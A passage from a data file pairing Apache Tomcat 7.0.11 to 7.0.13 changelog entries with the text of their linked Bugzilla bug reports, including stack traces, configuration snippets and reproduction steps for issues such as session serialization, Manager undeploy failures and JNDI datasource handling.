After the tomcat has just started, everything is fine but after one or two days a lot of ArrayIndexOutOfBoundsException occur on random pages of the application.

Tomcats started without this parameter don't seem to have that problem.

Unfortunately we weren't able reproduce the bug locally, It appears only on our production system.

Could there be a concurrency problem, that only shows if a lot it going on on the platform?

I can provide two small stackstraces that can show the classes where the problem occurs:

1.

Caused by: java.lang.ArrayIndexOutOfBoundsException
        at org.apache.jasper.runtime.BodyContentImpl.write(Unknown Source)
        at java.io.PrintWriter.write(PrintWriter.java:382)
        at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(Unknown Source)
        at org.apache.jasper.runtime.PageContextImpl.release(Unknown Source)
        at org.apache.jasper.runtime.JspFactoryImpl.internalReleasePageContext(Unknown Source)
        at org.apache.jasper.runtime.JspFactoryImpl.releasePageContext(Unknown Source)
        at org.apache.jsp.members.lists.short_.incomingShortList_jsp._jspService(incomingShortList_jsp.java:796)
        at org.apache.jasper.runtime.HttpJspBase.service(Unknown Source)
        at javax.servlet.http.HttpServlet.service(Unknown Source)

2.

Caused by: java.lang.ArrayIndexOutOfBoundsException
        at java.lang.String.getChars(String.java:854)
        at org.apache.jasper.runtime.BodyContentImpl.write(Unknown Source)
        at org.apache.jasper.runtime.BodyContentImpl.write(Unknown Source)
        at org.apache.jasper.runtime.BodyContentImpl.print(Unknown Source)
        at org.apache.taglibs.standard.tag.common.fmt.MessageSupport.doEndTag(MessageSupport.java:203)
        at org.apache.jsp.members.profiles.profile_jsp._jspx_meth_fmt_005fmessage_005f2(profile_jsp.java:4897)
        at org.apache.jsp.members.profiles.profile_jsp._jspService(profile_jsp.java:481)
        at org.apache.jasper.runtime.HttpJspBase.service(Unknown Source)
        at javax.servlet.http.HttpServlet.service(Unknown Source)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51124
Cluster|Tomcat 7.0.13 (markt)|fix|50950|Correct possible NotSerializableException for an authenticated session when running with a security manager. (markt)|NotSerializableException: org.apache.catalina.realm.GenericPrincipal|"Because this issue (https://issues.apache.org/bugzilla/show_bug.cgi?id=47502) is fixed I re-enabled using the security-constraint in web.xml to protect some pages instead of using my own workaround. But now I get a somewhat similar exception.

This is running Tomcat 6.0.32 (directly from your tar.gz) on Debian 5 in a cluster of 3 nodes.
I access my password protected pages over https.

 Mar 11, 2011 1:20:48 PM org.apache.catalina.ha.session.DeltaManager requestCompleted
 SEVERE: Unable to serialize delta request for sessionid [7D6D6A80C080C132F7EDCDAA3DFCEFB7]
 java.io.NotSerializableException: org.apache.catalina.realm.GenericPrincipal
     at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1164)
     at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:330)
     at java.util.LinkedList.writeObject(LinkedList.java:943)
     at sun.reflect.GeneratedMethodAccessor65.invoke(Unknown Source)
     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
     at java.lang.reflect.Method.invoke(Method.java:597)
     at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:945)
     at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1469)
     at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1400)
     at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1158)
     at java.io.ObjectOutputStream.access$300(ObjectOutputStream.java:143)
     at java.io.ObjectOutputStream$PutFieldImpl.writeFields(ObjectOutputStream.java:1677)
     at java.io.ObjectOutputStream.writeFields(ObjectOutputStream.java:462)
     at javax.security.auth.Subject$SecureSet.writeObject(Subject.java:1281)
     at sun.reflect.GeneratedMethodAccessor64.invoke(Unknown Source)
     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
     at java.lang.reflect.Method.invoke(Method.java:597)
     at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:945)
     at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1469)
     at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1400)
     at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1158)
     at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1518)
     at java.io.ObjectOutputStream.defaultWriteObject(ObjectOutputStream.java:422)
     at java.util.Collections$SynchronizedCollection.writeObject(Collections.java:1602)
     at sun.reflect.GeneratedMethodAccessor63.invoke(Unknown Source)
     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
     at java.lang.reflect.Method.invoke(Method.java:597)
     at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:945)
     at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1469)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50950
Web applications|Tomcat 7.0.13 (markt)|update||Configure Security Manager How-To to include a copy of the actual conf/catalina.policy file when the documentation is built, rather than maintaining a copy of its content. (kkolinko)|||
Web applications|Tomcat 7.0.13 (markt)|fix||Fix broken stylesheet URL in XML based manager status output. (rjung)|||
Web applications|Tomcat 7.0.13 (markt)|fix|51156|Ensure session expiration option is available in Manager application was running web applications that were defined in server.xml. (markt)|"""Expire sessions"" button not visible for context configured in server.xml"|"If app is configured in server.xml like this:

{code}
  <Host name=""www.myapp.pl"" appBase=""/usr/lib/tomcat/webapps""
                unpackWARs=""false"" autoDeploy=""false""
              xmlValidation=""false"" xmlNamespaceAware=""false""  >
     <Context docBase=""/var/www/myapp"" path="""" cacheMaxSize=""5120""
cacheTTL=""60000"" cachingAllowed=""true"" >
     </Context>
     <Context path=""/manager""  privileged=""true""
docBase=""/usr/lib/tomcat/webapps/manager"">
     </Context>
</Host>
{code}

In Tomcat Manager, on the application list, there is a button ""Expire
sessions""  available only for ""/manager"" application.
There is no button ""Expire sessions"" for ""/"" path.

I think bug is in HTMLManagerServlet.java in this part:

{code}

                if (context.getPath().equals(this.context.getPath())) {
                    writer.print(MessageFormat.format(
                        MANAGER_APP_ROW_BUTTON_SECTION, args));
                } else if (context.getAvailable() && isDeployed) {
                    writer.print(MessageFormat.format(
                        STARTED_DEPLOYED_APPS_ROW_BUTTON_SECTION, args));
                } else if (context.getAvailable() && !isDeployed) {
                    writer.print(MessageFormat.format(
                        STARTED_NONDEPLOYED_APPS_ROW_BUTTON_SECTION, args));
                } else if (!context.getAvailable() && isDeployed) {
                    writer.print(MessageFormat.format(
                        STOPPED_DEPLOYED_APPS_ROW_BUTTON_SECTION, args));
                } else {
                    writer.print(MessageFormat.format(
                        STOPPED_NONDEPLOYED_APPS_ROW_BUTTON_SECTION, args));
                }
{code}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51156
Other|Tomcat 7.0.13 (markt)|update||Clarify error messages in *.sh files to mention that if a script is not found it might be because execute permission is needed. (kkolinko)|||
Other|Tomcat 7.0.13 (markt)|update||Update Apache Commons Pool to 1.5.6. (markt)|||
Other|Tomcat 7.0.13 (markt)|fix|51135|Fix auto-detection of JAVA_HOME for 64-bit Windows platforms that only have a 32-bit JVM installed. (markt)|[Windows installer] Autoselect 32-bit JRE on 64-bit systems if 64-bit one is not available|"Enhance the Windows installer for Apache Tomcat when running on 64-bit Windows to search for both the 64-bit and 32-bit JVMs,  and to select the 32-bit one if it is the only one installed in the system.

Discussed in the ""(Issue) Tomcat 7.0.12 silent install"" thread on users@,
http://marc.info/?t=130393025700005&r=1&w=2
http://markmail.org/thread/zsgioxmwcog4jkfc"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51135
Other|Tomcat 7.0.13 (markt)|fix|51154|Remove duplicate @deprecated tags in ServletContext Javadoc. Patch provided by sebb. (markt)|Spurious @deprecated tags in ServletContext|"Created attachment 26960 [details]
Remove spurious tags

There are some spurious @deprecated tags in ServletContext."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51154
Other|Tomcat 7.0.13 (markt)|fix|51155|Add comments to @deprecated tags that have none. Patch provided by sebb. (markt)|Missing @deprecated comments|"Created attachment 26961 [details]
Patch to add the missing comments

There are several @deprecated tags without any information at all.
The tags should say when the deprecation was added and what the replacement is."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51155
Catalina|Tomcat 7.0.12 (markt)|add||Automatically correct invalid paths when specified for Context elements inside server.xml and log a warning that the configuration has been corrected. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Don't unpack WAR files if they are not located in the Host's appBase. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Don't log to standard out in SSLValve. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Handle the case where a web crawler provides an invalid session ID in the CrawlerSessionManagerValve. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|update||Update pattern used in CrawlerSessionManagerValve to that used by the ASF infrastructure team. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Remove unnecessary whitespace from MIME mapping entries in global web.xml file. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||When using parallel deployment, correctly handle the scenario when the client sends multiple JSESSIONID cookies. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|add|12428|Add support (disabled by default) for preemptive authentication. This can be configured per context. Based on a patch suggested by Werner Donn. (markt)|request.getUserPrincipal(): Misinterpretation of specification?|"When calling request.getUserPrincipal() from an unprotected resource, the method returns 
null even when the user is actually authenticated.

From Servlet 2.3 spec:
public 
java.security.Principal getUserPrincipal()
Returns a java.security.Principal object 
containing the name of the current
authenticated user. If the user has not been authenticated, 
the method returns
null.

My interpretation would be that once a user has been 
authenticated, a call to getUserPrincipal() would always return the associated Principal 
object whether it is from a protected or unprotected resource."|https://bz.apache.org/bugzilla/show_bug.cgi?id=12428
Catalina|Tomcat 7.0.12 (markt)|fix||Make the CSRF nonce cache serializable so that it can be replicated across a cluster and/or persisted across Tomcat restarts. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|update||"Resolve some refactoring TODOs in the implementation of the new Context attribute ""swallowAbortedUploads"". (markt)"|||
Catalina|Tomcat 7.0.12 (markt)|fix||Include the seed time when calculating the time taken to create SecureRandom instances for session ID generation, report excessive times (greater than 100ms) at INFO level and provide a value for the message key so a meaningful message appears in the logs. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Don't register Contexts that fail to start with the Mapper. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|add|48685|Add initial support for SPNEGO/Kerberos authentication also referred to as integrated Windows authentication. This includes user authentication, authorisation via the directory using the user's delegated credentials and exposing the user's delegated credentials via a request attribute so applications can make use of them to impersonate the current user when accessing third-party systems that use a compatible authentication mechanism. Based on a patch provided by Michael Osipov. (markt)|Spnego Support in Tomcat|"Uploading  a patch. Kindly verify. To use this patch the users have to set up a system property as true
org.apache.tomcat.config.NEGOTIATE = true"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48685
Catalina|Tomcat 7.0.12 (markt)|fix||HTTP range requests cannot be reliably served when a Writer is in use so prevent the DefaultServlet from attempting to do so. (kkolinko)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Protect the DefaultServlet from Valves, Filters and Wrappers that write content to the response. Prevent partial responses to partial GET requests in this case since the range cannot be reliably determined. Also prevent the DefaultServlet from setting a content length header since this too cannot be reliably determined. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix|50929|When wrapping an exception, include the root cause. Patch provided by sebb. (markt)|[patch] Ensure rethrown exceptions retain the original cause|"Created attachment 26770 [details]
Patch to fix problem in some files

Where an exception is caught an rethrown, it helps to provide the original exception as the cause."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50929
Catalina|Tomcat 7.0.12 (markt)|fix|50991|Fix regression in fix for 25060 that called close on a JNDI resource while it was still available to the application. (markt)|Data source is closed before contextDestroyed is executed. tomcat 7.0.11|"In my ServletContextListener contextDestroyed method I do a database update to clean up a table.  In tomcat 7.0.11, I get the error (see below) when I shutdown tomcat.
Mar 28, 2011 10:47:57 AM org.apache.catalina.core.ApplicationContext log
> INFO: ContextListener: contextDestroyed()
> Mar 28, 2011 10:47:57 AM org.apache.catalina.core.StandardContext listenerStop
> SEVERE: Exception sending context destroyed event to listener instance of class org.ycmi.listeners.contextListener
> java.lang.RuntimeException: java.sql.SQLException: Data source is closed
>         at org.ycmi.prot.ypresults.db.dbUtils.update(dbUtils.java:495)
>         at org.ycmi.listeners.contextListener.contextDestroyed(contextListener.java:58)

This looks like the DataSource is being closed before contextDestroyed is run so I can't do the clean up. This wasn't a problem in tomcat 6.

As noted by Mark Thomas, this may be related to
https://issues.apache.org/bugzilla/show_bug.cgi?id=25060"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50991
Catalina|Tomcat 7.0.12 (markt)|add||Provide a configuration option that lets the close method to be used for a JNDI Resource to be defined by the user. This change also disables using the close method unless one is explicitly defined for the resource and limits it to singleton resources. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Correctly track changes to context.xml files and trigger redeployment when copyXML is set to false. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix|50997|Relax the requirement that directories must have a name ending in .jar to be treated as an expanded JAR file by the default JarScanner. Based on patch by Rodion Zhitomirsky. (markt)|"StandardJarScanner ignores web-fragment.xml files in unpacked jars if they are not ending with "".jar"""|"Created attachment 26816 [details]
Fix for directories in classpath not ending with .jar

We use eclipse sysdeo tomcat plugin for eclipse. It allows us to add target build directories of eclipse into tomcat classpath. All works fine until we decided to use web-fragment functionality. It failed to work despite the config:

<JarScanner scanAllDirectories=""true""/>

I fixed the problem. Please, see attached proposed patch."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50997
Catalina|Tomcat 7.0.12 (markt)|fix||Don't append the jvmRoute to a session ID if the jvmRoute is a zero length string. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Don't register non-singleton DataSource resources with JMX. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|add||CVE-2011-1184: Provide additional configuration options for the DIGEST authenticator. (markt)|||
Catalina|Tomcat 7.0.12 (markt)|fix||Provide a workaround for Tomcat hanging during shutdown when running the unit tests. (markt)|||
Coyote|Tomcat 7.0.12 (markt)|add|50887|Add support for configuring the JSSE provider used to convert client certificates. Based on a patch by pknopp. (markt)|Enhancement to set security-provider within AjpAprProcessor|"Created attachment 26742 [details]
Patches to set a securityProvider 

We need support of X.509 certificates using elliptic curves for client-auth
within an servlet-application.

The certificates we use are coded using DomainParameters within the
PublicKey object. When using the sun-jdk this will
lead to an error because the sun-jce implementation only supports elliptic
curves as NamedCurves.

The best way to fix this is to use another security-provider e.g.
bouncycastle.
For that we need a way to configure it within tomcat."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50887
Coyote|Tomcat 7.0.12 (markt)|fix|50903|When a connector is stopped, ensure that requests that are currently in a keep-alive state and waiting for client data are not processed. Requests where processing has started will continue to completion. (markt)|Current keep-alive request processed after connector.stop()|"When the connector is stopped, if a connection is in a keep-alive state the next request received by that connection will be processed and then the connection will be closed. When the request is received, it should be rejected.

Outstanding questions:
- What return code (if any) should be sent back to the client?
- If the reading of a request starts before the connector is stopped, should that request be allowed to complete or should it be rejected?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50903
Coyote|Tomcat 7.0.12 (markt)|fix|50927|Improve error message when SSLCertificateFile is not specified when using APR with SSL. Based on a patch provided by sebb. (markt)|[patch] More specific error message for missing SSLCertificateFile|"Created attachment 26767 [details]
Patch to check and report error

If using SSL with APR, a missing SSLCertificateFile attribute currently results in a somewhat cryptic message from the native code.

This patch checks whether the attribute is null before calling the native code, and reports a more specific error."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50927
Coyote|Tomcat 7.0.12 (markt)|fix|50928|Don't ignore keyPass attribute for HTTP BIO and NIO connectors. Based on a patch provided by sebb. (markt)|[patch] JSSESocketFactory - wrong password in KeyManagerFactory.init|"Created attachment 26768 [details]
Patch to fix problem

JSSESocketFactory does not use the keyPass when calling KeyManagerFactory.init()

Attached patch fixes the error.

However, it might be better to fix up the handling of keyPass and keyStorePass defaults in the AbstractEndPoint super-class.

Patch also fixes a throw clause to ensure that the true cause of the exception is reported."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50928
Cluster|Tomcat 7.0.12 (markt)|fix||Securely seed the SecureRandom instance used for UUID generation and report excessive creation time (greater than 100ms) at INFO level. (markt)|||
Web applications|Tomcat 7.0.12 (markt)|fix|50924|Clean-up HTTP connector comparison table. (markt)|Table does not mention Tomcat 7|"The comparison table under:

http://tomcat.apache.org/tomcat-7.0-doc/config/http.html#Connector_Comparison

does not mention Tomcat 7"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50924
Web applications|Tomcat 7.0.12 (markt)|add||Slightly expanded the documentation of the Host element to clarify the relationship between host name and DNS name. (markt)|||
Web applications|Tomcat 7.0.12 (markt)|fix|50925|Update SSL how-to to take account of keyPass connector attribute. (markt)|Key password no longer has to be same as keystore password|"http://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html#Configuration

says:

""You MUST use the same password here as was used for the keystore password itself. This is a restriction of the Tomcat implementation.""

However, surely Tomcat 7 now supports the ""keyPass"" attribute?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50925
Web applications|Tomcat 7.0.12 (markt)|update||Improve Tomcat Logging documentation. (kkolinko)|||
Web applications|Tomcat 7.0.12 (markt)|fix||Align the authenticator documentation and MBean descriptors with the implementation. (markt)|||
Web applications|Tomcat 7.0.12 (markt)|fix||Prevent the custom error pages for the Manager and Host Manager applications from being accessed directly. (markt)|||
Web applications|Tomcat 7.0.12 (markt)|fix|50984|When using the Manager application ensure that undeployment fails if a file cannot be deleted. (markt)|Manager application fails to report stranded artifacts when undeploying|"[NOTE: this is tomcat 7.0.11, not 7.0.10, but the version is not given as a choice, I therefore file it as 7.0.10, which I suspect has the same bug]

Scenario:

* tomcat starts, as user u1, with only the manager application in place;
* it is configured as to not deploy automatically;
* user u1 copies a webapp tree into $CATALINA_HOME/webapps, which it
can since it has write/execute access to this directory;
* the manager webapp is called to deploy that new web application;
* [in between, credentials on the deployed webapp directory are
changed so that user u1 cannot remove the webapp at all]
* the manager webapp is called to undeploy that application, BUG: it
answers OK, but it is not.

The manager webapp documentation explicitly states that undeploying an
application means that the webapp tree is removed - but of course, in
this case it isn't. Use case below, where $CATALINA_HOME/webapps is a symlink to /var/lib/o3/tomcat/installs:

----
# Only manager webapp running initially
[o3@tomcat-r8 cockpit]$ wget -O - -q --http-user=tomcat
--http-password=tomcat  http://localhost:8080/manager/text/list|sed 1d
/manager:running:6:/usr/share/tomcat7/webapps/manager
# webapp tree is created by other means. Now deploying the application:
[o3@tomcat-r8 cockpit]$ wget -O - -q --http-user=tomcat --http-password=tomcat http://localhost:8080/manager/text/deploy'?path=/cockpit&war=file:/var/lib/o3/tomcat/installs/cockpit'
OK - Deployed application at context path /cockpit
[...]
# In another terminal:
[root@tomcat-r8 installs]# pwd
/var/lib/o3/tomcat/installs
# All files are created with umask 022. Just change the owner:
[root@tomcat-r8 installs]# chown -R root.root cockpit/
[...]
# Back to the first terminal:
[o3@tomcat-r8 cockpit]$ wget -O - -q --http-user=tomcat --http-password=tomcat
http://localhost:8080/manager/text/undeploy?path=/cockpit
OK - Undeployed application at context path /cockpit
# Here is the bug: even though the command returns OK, the tree still exists.
# The webapp is stopped, but it is not undeployed.
[o3@tomcat-r8 cockpit]$ wget -O - -q --http-user=tomcat
--http-password=tomcat  http://localhost:8080/manager/text/list|sed 1d
/manager:running:9:/usr/share/tomcat7/webapps/manager  
/cockpit:stopped:0:cockpit
# Listing the contents of $CATALINA_HOME/webapps, we see that the tree is still 
# there:
[o3@tomcat-r8 cockpit]$ ls /var/lib/o3/tomcat/installs
cockpit
----

The documentation states:

----
WARNING - This command will delete any web application artifacts that exist within appBase directory (typically ""webapps"") for this virtual host. This will
delete the the application .WAR, if present, the application directory resulting either from a deploy in unpacked form or from .WAR expansion as well as the XML Context definition from $CATALINA_BASE/conf/[enginename]/[hostname]/ directory.
----

This turns out to be false in this case. While the application is stopped, the web application artifacts are NOT removed. The
undeploy command should have failed with, say ""FAIL - context was stopped but some articats remain, check access rights"". What's more, the logs
don't mention that the webapp tree has failed to be removed at all.

If I chown back the webapp tree to its rightful owner, then the webapp
is indeed undeployed as intended: all artifacts are destroyed.

The culprit code seems to be at org/apache/catalina/manager/ManagerServlet.java, methods undeploy() and undeployDir(). Both use the .delete() method of File objects, but fail to check their return code."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50984
Other|Tomcat 7.0.12 (markt)|update||Update Eclipse JDT complier to 3.6.2. (markt)|||
Other|Tomcat 7.0.12 (markt)|update||Update WSDL4J library to 1.6.2 (used by JSR 109 support in the extras package). (markt)|||
Other|Tomcat 7.0.12 (markt)|update||Update optional CheckStyle library to 5.3. (markt)|||
Other|Tomcat 7.0.12 (markt)|fix|50911|Reduce noise generated during the build of the Windows installer so warnings are more obvious. Patch provided by sebb. (markt)|Quieten NSIS so errors and warnings can be seen|"Created attachment 26759 [details]
Patch to add /V2 flag

The NSIS phase currently generates so much output it is all but impossible to detect any warnings.

Using the switch /V2 restricts output to warnings and errors only."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50911
Other|Tomcat 7.0.12 (markt)|fix||Further work to reduce compiler and validation warnings across the code base. (markt)|||
Catalina|Tomcat 7.0.11 (markt)|fix||CVE-2011-1088: Completed fix. Don't ignore @ServletSecurity annotations. (markt)|||
Catalina|Tomcat 7.0.11 (markt)|add|25060|Close Apache Commons DBCP 1.x datasources when the associated JNDI naming context is stopped (e.g. for a non-global DataSource resource on web application reload) to close remaining database connections immediately rather than waiting for garbage collection. (markt)|Reloading context orphans currently open jndi datasource connections|"I fiddled around with this a while and have determined to the best of my ability
that this is a real bug.  I have a jndi datasource connected to a postgresql
server.  I have two jndi resources (a reader and writer) so that later I can
implement a system with replication etc and deal with writes and reads to
different connections.  To summarize, after using the system, there are two
connections to postgres that get reused -- one reader and writer.  Under load,
this number increases and will slowly go back down.  I usually end up with two
idle connections (one reader and one writer) left under no load.  If you reload
the context where the datasource is at (it's a context specific datasource), the
number of connections will jump by two when used.  Each reload produces 2 more
connections min until I restart the server.  It appears that after a reload, the
'persisted connections' get abandoned / orphaned.  Eventually, I hit my max
connections and cannot aquire any more and the system fails.  I have tried the
abandond collection parameters and have added debug logging to my code to ensure
that I am indeed calling close on the connections I checkout, even on exceptions
and error cases.  Under normal useage without reloads, no connection leakage
happens.

This is on a solaris 8 machine with the 4.1.27-hotfix-22096.tar.gz applied.  Let
me know if more information is required.  I have this in a development
environment and can let somone attach in jdb and hammer on the thing since it's
not a production system -- if that will help in getting a repro.

Wayne"|https://bz.apache.org/bugzilla/show_bug.cgi?id=25060
Catalina|Tomcat 7.0.11 (markt)|add|26701|Provide a mechanism for users to register their own URLStreamHandlerFactory objects. (markt)|Enabling web applications to register their own stream handlers|"A stream handler factory can be registered once per VM and tomcat registers the 
DirContextStreamHandlerFactory for the jndi protocol. However if there are web 
applications running inside that want to register handlers for custom scheme 
currently it is not possible.

Can the DirContextStreamHandlerFactory be enhanced to allow applications to 
register stream handler for custom schemes they might have. Or better can this 
be a made a property in the context.xml file ?

Is this already there - or can this enhanced in the future?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=26701
Catalina|Tomcat 7.0.11 (markt)|fix|50855|Fix NPE on HttpServletRequest.logout() when debug logging is enabled. (markt)|NullPointerException thrown in AuthenticatorBase.register method for null principal|"The description is the same as for the older bug 39255, except it is produced at
org.apache.catalina.authenticator.AuthenticatorBase.register(AuthenticatorBase.java:688)

Please, see the following link 
https://issues.apache.org/bugzilla/show_bug.cgi?id=39255

This bug has been fixed for Tomcat 5.5.16, but it looks to appear again in Tomcat 7.

This is the excerpt from AuthenticatorBase.java:
   public void register(Request request, HttpServletResponse response,
                            Principal principal, String authType,
                            String username, String password) {

       if (log.isDebugEnabled())
            log.debug(""Authenticated '"" + principal.getName() + ""' with type '""
                + authType + ""'"");

It is seen that there is no more condition to verify if principal is null.

Specifically, the NullPointerException is thrown when calling HttpServletRequest.logout method from a JSF managed bean. According to Java EE 6 documentation, the logout method establishes null as the value returned when getUserPrincipal, getRemoteUser, and getAuthType is called on the request. Hence, the exception thrown."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50855
Catalina|Tomcat 7.0.11 (markt)|add||"New context attribute ""swallowAbortedUploads"" allows to make request data swallowing configurable for requests that are too large. (rjung)"|||
Catalina|Tomcat 7.0.11 (markt)|fix|50854|Add additional permissions required by the Manager application when running under a security Manager and support a shared Manager installation when $CATALINA_HOME != CATALINA_BASE. (markt)|Additional catalina.policy entries for when Security Manager enabled, for session display functionality|"When running under a security manager, in 7.0.x (and also around 6.0.29+), the Sessions List options in the Tomcat Manager may display an error under certain conditions.

CONDITION 1:

APR enabled, catalina.base == catalina.home:

- Encountered exception org.apache.jasper.JasperException: javax.servlet.ServletException: java.lang.NoClassDefFoundError: org/apache/catalina/ha/session/DeltaSession

This permission is required:
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.ha.*"";

CONDITION 2:

Regardless of APR, if catalina.base != catalina.home and catalina.home is the location of the webapps/manager application, this error displays:

FAIL - Encountered exception org.apache.jasper.JasperException: An exception occurred processing JSP page /WEB-INF/jsp/sessionsList.jsp at line 99

96: 			<tbody>
97: <% Iterator iter = activeSessions.iterator();
98:    while (iter.hasNext()) {
99:    	Session currentSession = (Session) iter.next();
100:    	String currentSessionId = JspHelper.escapeXml(currentSession.getId());
101: %>
102: 				<tr>

This is because the policy file assumes there is a per-instance webapps/manager application in catalina.base, as opposed to a shared one in catalina.home.

Suggested fix, in catalina.policy, replace ...

// The Manager application needs access to the following packages to support the
// session display functionality
grant codeBase ""file:${catalina.base}/webapps/manager/-"" {
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina"";
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.manager"";
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.manager.util"";
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.ha.*"";
};

... with ...

// The Manager application needs access to the following packages to support the
// session display functionality
grant codeBase ""file:${catalina.home}/webapps/manager/-"" {
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina"";
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.manager"";
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.manager.util"";
    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.ha.*"";
};

// If using a per instance webapps directory, i.e. ${catalina.base}/webapps,
// then the following permission will need to be uncommented
// grant codeBase ""file:${catalina.base}/webapps/manager/-"" {
//     permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina"";
//     permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.manager"";
//     permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.manager.util"";
//     permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.ha.*"";
// };

* In the above, I've used the same commented-out approach as the one for the ""file:${catalina.base}/lib/-"" permissions for consistency, but the catalina.base permissions could also be left uncommented if most installations copy the default webapps folder into each instance and use it from there, to make larger deployments easier.

Best Regards,
Neale Rudd"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50854
Catalina|Tomcat 7.0.11 (markt)|fix|50893|Add additional information to the download README for the extras components. (markt)|Extras etc documentation not easy to find|"http://tomcat.apache.org/download-70.cgi#7.0.10 says:

Please see the README file for packaging information. It explains what every distribution contains. 

...

Extras:

    * JMX Remote jar (pgp, md5)
    * Web services jar (pgp, md5)
    * JULI adapters jar (pgp, md5)
    * JULI log4j jar (pgp, md5)

==

The README says:

bin/extras/
    Additional components. See documentation.

The documemtation links to:

http://tomcat.apache.org/tomcat-7.0-doc/extras.html

which has sections called:
* Full commons-logging implementation
* Web Services support (JSR 109)
but does not cover JMX or how the JULI jars are to be used.

The README does not actually document what the Deployer, Extras and Embedded downloads contain. Please could the download page point directly to the documentation for these instead?

And there does not appear to be any docn. for the JMX Remote Jar at all."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50893
Catalina|Tomcat 7.0.11 (markt)|fix||Calling stop() and then destroy() on a connector incorrectly triggered an exception. (markt)|||
Coyote|Tomcat 7.0.11 (markt)|add|48208|Allow the configuration of a custom trust manager for use in CLIENT-CERT authentication. (markt)|"allow to configure a custom client certificate Trust Manager in server.xml per connector attribute ""trustManagerClassName"""|"Created attachment 24546 [details]
patch_48158_c5_wildCard.txt

as per bug 48158 comment 8, this is now an RFE on its own:

Luciana has come up with a patch to allow accepting any client certificate on a
per Connector basis.

In server.xml the following attribute should be added in the Connector element:

<Connector ... acceptAllCerts=""true""/>

If this argument is present and set to true or yes, then the
AcceptAllTrustManager will be used as Trust Manager.

The ""truststoreFile"" of
http://tomcat.apache.org/tomcat-5.5-doc/ssl-howto.html#Edit%20the%20Tomcat%20Configuration%20File
can be left empty

originally was attachment (id=24542)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48208
Coyote|Tomcat 7.0.11 (markt)|fix||Fix issues that prevented asynchronous servlets from working when used with the HTTP APR connector on platforms that support TCP_DEFER_ACCEPT. (markt)|||
Jasper|Tomcat 7.0.11 (markt)|fix||Correct possible threading issue in JSP compilation when development mode is used. (markt)|||
Jasper|Tomcat 7.0.11 (markt)|fix|50895|Don't initialize classes created during the compilation stage. (markt)|JSP compiler initializes classes during compile which can result in failures|"The fix for Bug 49555 adds the following code call:

                clazz = Class.forName(className, true, tccl);

The 2nd argument (initialize) is set to true resulting in it attempting to initialize the class.  This can result in compilation failures if the class has ugly static initializer requirements.  It can also increases the time and memory footprint of compilation as the classes.

